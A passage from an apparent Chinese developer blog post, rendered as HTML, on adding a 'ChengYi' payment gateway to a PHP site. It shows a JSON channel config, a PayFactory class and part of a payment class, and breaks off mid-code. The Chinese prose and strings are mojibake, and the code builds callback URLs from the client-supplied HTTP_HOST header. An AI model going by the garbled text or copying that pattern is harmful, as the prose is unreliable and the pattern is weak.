   <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;åé“¶&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantID&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPrivateKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;merchantPublicKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;platformPublicKey&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;payType&quot;</span>: [</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;å¾®ä¿¡æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;weixin_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">4</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;æ”¯ä»˜å®æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;alipay_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">7</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;QQé’±åŒ…å®æ‰«ç æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;tenpay_scan&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">&quot;id&quot;</span>: <span class="number">10</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;ç½‘é“¶æ”¯ä»˜&quot;</span>,<span class="attr">&quot;payStr&quot;</span>:<span class="string">&quot;direct_pay&quot;</span>,<span class="attr">&quot;payEntrance&quot;</span>:<span class="string">&quot;1,2,3,4&quot;</span>,<span class="attr">&quot;payStatus&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;request_type&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>æ€è·¯å·²ç»æ¸…æ™°äº†ï¼Œç›´æ¥ä»æ–‡ä»¶ä¸­æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æ”¯ä»˜é…ç½®ï¼Œæœç„¶åå°æ”¯ä»˜åˆ—è¡¨ä¸­å‡ºç°äº†ï¼Œæ·»åŠ ä¸Šè¯¥æ”¯ä»˜çš„é…ç½®å‚æ•°</p><ul><li>æ·»åŠ åï¼Œå‘èµ·æ”¯ä»˜ï¼ŒæŠ¥æ— æ­¤æ”¯ä»˜æ–¹å¼çš„é”™è¯¯ï¼Œç›´æ¥åœ¨ä»£ç ä¸­æœç´¢è¿™ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œæ‰¾åˆ°è¿™ä¸ª<code>PayFactory.php</code>å·¥å‚ç±»ï¼Œéƒ¨åˆ†ä»£ç å¦‚ä¸‹</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Kevin.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> kevin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span> HCHT 2017/9/15 17:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> æ”¯ä»˜å·¥å‚ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">include_cache(S_CORE . <span class="string">&#x27;class&#x27;</span> . DS . <span class="string">&#x27;pay&#x27;</span>  . DS . <span class="string">&#x27;chengyi.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PayFactory</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInterface</span>(<span class="params"><span class="variable">$payMent</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$payMent</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;cheng_yi_pay&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> cheng_yi_pay();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                ErrorCode::errorResponse(<span class="number">200015</span>, <span class="string">&#x27;çº¿ä¸Šæ”¯ä»˜æ–¹å¼ä¸å­˜åœ¨&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯å·²ç»å¾ˆæ˜æœ—äº†ï¼Œåˆ›å»ºä¸€ä¸ªæ”¯ä»˜ç±»ï¼Œæ·»åŠ ä¸Šcaseåˆ†æ”¯</p><ul><li>éšä¾¿æ‰“å¼€ä¸€ä¸ªæ”¯ä»˜ç±»ï¼Œæ ¹æ®å®ƒçš„éƒ¨åˆ†é€»è¾‘ï¼Œæ¥å…¥æ–°çš„æ”¯ä»˜é€»è¾‘ï¼Œå¤„ç†å¼‚æ­¥å›è°ƒæ—¶ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå›è°ƒå¯ä¾›é€‰æ‹©ï¼Œä¸€ä¸ªåœ¨<code>recharge.php</code>ä¸­ï¼Œä¸€ä¸ªåœ¨æ ¹ç›®å½•ä¸‹çš„<code>rechargeNotify.php</code>ä¸­ï¼ŒåŒæ­¥å›è°ƒåœ¨æ ¹ç›®å½•ä¸‹<code>beeePayOk.php</code>ï¼Œå…·ä½“å¯é˜…è¯»ä»£ç ï¼Œæ²¡æœ‰å¿…è¦å¼ è´´</li></ul><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>å…·ä½“çš„æ”¯ä»˜ç±»ä»£ç ï¼Œä»…ä¾›å‚è€ƒï¼Œæ¯ä¸ªæ”¯ä»˜çš„å…·ä½“å®ç°éƒ½æœ‰å·®åˆ«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> è¯šæ„æ”¯ä»˜</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">include_cache(S_CORE . <span class="string">&#x27;class&#x27;</span> . DS . <span class="string">&#x27;pay&#x27;</span> . DS . <span class="string">&#x27;payinfo&#x27;</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChengYiPay</span> <span class="keyword">extends</span> <span class="title">PayInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//è¯·æ±‚æ¥å£Url</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>      = <span class="string">&#x27;https://pay.chenyipay.com/api/pay/v2&#x27;</span>;</span><br><span class="line">    <span class="comment">//æ¥å£åç§°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payName</span>  = <span class="string">&#x27;è¯šæ„æ”¯ä»˜&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–æ”¯ä»˜è¿”å›æ•°æ®æ ¼å¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$retArr</span> = [               <span class="comment">//æ”¯ä»˜ä¿¡æ¯è¿”å›æ ¼å¼</span></span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,             <span class="comment">//0:æ•°æ®è·å–æˆåŠŸï¼Œå…¶ä»–æ•°å­—ï¼Œæ•°æ®è·å–å¤±è´¥</span></span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,             <span class="comment">//è¿”å›çš„æç¤ºä¿¡æ¯</span></span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; []             <span class="comment">//è¿”å›æ•°æ®</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå¤„ç†è¿”å›æ•°æ®æ ¼å¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orderInfo</span> = [            <span class="comment">//å¼‚æ­¥éªŒç­¾ç»“æœè¿”å›æ ¼å¼</span></span><br><span class="line">        <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>,                 <span class="comment">//0ï¼šæ•°æ®è·å–æˆåŠŸï¼Œå…¶ä»–æ•°å­—ï¼Œæ•°æ®è·å–å¤±è´¥</span></span><br><span class="line">        <span class="string">&#x27;bank_num&#x27;</span> =&gt; <span class="number">219050</span>,        <span class="comment">//é“¶è¡ŒåŒºåˆ†å·ï¼ˆä¸åŒæ”¯ä»˜çš„å‰ä¸‰ä½ä¸åŒï¼‰</span></span><br><span class="line">        <span class="string">&#x27;order_no&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,            <span class="comment">//åå°æ•°æ®åº“æ”¯ä»˜è®¢å•å·</span></span><br><span class="line">        <span class="string">&#x27;amount&#x27;</span> =&gt; <span class="number">0</span>,               <span class="comment">//æ”¯ä»˜é‡‘é¢</span></span><br><span class="line">        <span class="string">&#x27;ret_error&#x27;</span> =&gt; <span class="number">0</span>,            <span class="comment">//å›è°ƒå¤„ç†å¤±è´¥æ—¶ï¼Œè¿”å›æ¥å£å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="string">&#x27;ret_success&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,        <span class="comment">//å›è°ƒå¤„ç†æˆåŠŸæ—¶ï¼Œè¿”å›æ¥å£å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="string">&#x27;bank_name&#x27;</span> =&gt; <span class="string">&#x27;è¯šæ„æ”¯ä»˜&#x27;</span>,     <span class="comment">//æ”¯ä»˜æ–¹å¼åç§°</span></span><br><span class="line">        <span class="string">&#x27;serial_no&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>            <span class="comment">//ç¬¬ä¸‰æ–¹å›è°ƒè¿”å›çš„ç¬¬ä¸‰æ–¹æ”¯ä»˜è®¢å•å·ï¼ˆæ”¯ä»˜æµæ°´å·ï¼‰</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„æˆå‡½æ•°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è°ƒç”¨ç¬¬ä¸‰æ–¹æ”¯ä»˜æ¥å£ï¼Œè·å–æ”¯ä»˜ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data å‰ç«¯è¿”å›ä¿¡æ¯ï¼Œpayment_idï¼Œæ”¯ä»˜ç±»å‹IDï¼Œconfigï¼Œæ”¯ä»˜ç±»å‹é…ç½®ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> PayInfo::doPay()</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this-&gt;$retArr;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPay</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//ç”Ÿæˆè®¢å•</span></span><br><span class="line">        <span class="variable">$orderInfo</span> = <span class="keyword">$this</span>-&gt;makeOrder(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$orderInfo</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219000</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜è®¢å•ç”Ÿæˆå¤±è´¥&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;è®¢å•ç”Ÿæˆå¤±è´¥ï¼Œ&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–é…ç½®æ”¯ä»˜ä¿¡æ¯</span></span><br><span class="line">        <span class="variable">$config</span>      = unserialize(<span class="variable">$data</span>[<span class="string">&#x27;config&#x27;</span>]);</span><br><span class="line">        <span class="variable">$callbackurl</span> = <span class="variable">$config</span>[<span class="string">&#x27;callbackurl&#x27;</span>]?<span class="variable">$config</span>[<span class="string">&#x27;callbackurl&#x27;</span>]:<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] = <span class="number">219001</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;msg&#x27;</span>]  = <span class="string">&#x27;æ”¯ä»˜é“¶è¡Œç±»å‹ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">            payLog(<span class="string">&#x27;payerror.log&#x27;</span>, <span class="string">&#x27;ï¼ˆ&#x27;</span> . <span class="keyword">$this</span>-&gt;retArr[<span class="string">&#x27;code&#x27;</span>] . <span class="string">&#x27;ï¼‰&#x27;</span> . <span class="keyword">$this</span>-&gt;payName . <span class="string">&#x27;é“¶è¡Œç±»å‹ä¸å­˜åœ¨ï¼Œ&#x27;</span> . print_r(<span class="variable">$data</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;retArr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$postData</span> = [</span><br><span class="line">            <span class="string">&#x27;p1_mchtid&#x27;</span>   =&gt; <span class="variable">$config</span>[<span class="string">&#x27;merchantID&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p2_paytype&#x27;</span>  =&gt; <span class="variable">$config</span>[<span class="string">&#x27;payType&#x27;</span>][<span class="variable">$data</span>[<span class="string">&#x27;pay_type&#x27;</span>]][<span class="string">&#x27;payStr&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p3_paymoney&#x27;</span> =&gt; <span class="variable">$data</span>[<span class="string">&#x27;money&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;p4_orderno&#x27;</span>  =&gt; <span class="variable">$orderInfo</span>,</span><br><span class="line">            <span class="comment">//å¼‚æ­¥</span></span><br><span class="line">            <span class="string">&#x27;p5_callbackurl&#x27;</span> =&gt; <span class="string">&quot;http://&quot;</span>.<span class="variable">$callbackurl</span>.<span class="string">&quot;/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=&quot;</span> . <span class="variable">$data</span>[<span class="string">&#x27;payment_id&#x27;</span>],</span><br><span class="line">            <span class="comment">//åŒæ­¥</span></span><br><span class="line">            <span class="string">&#x27;p6_notifyurl&#x27;</span> =&gt; <span class="string">&quot;http://&quot;</span>.<span class="variable">$callbackurl</span>.<span class="string">&quot;/beeePayOk.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;p7_version&#x27;</span>   =&gt; <span class="string">&#x27;v2.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;p8_signtype&#x27;</span>  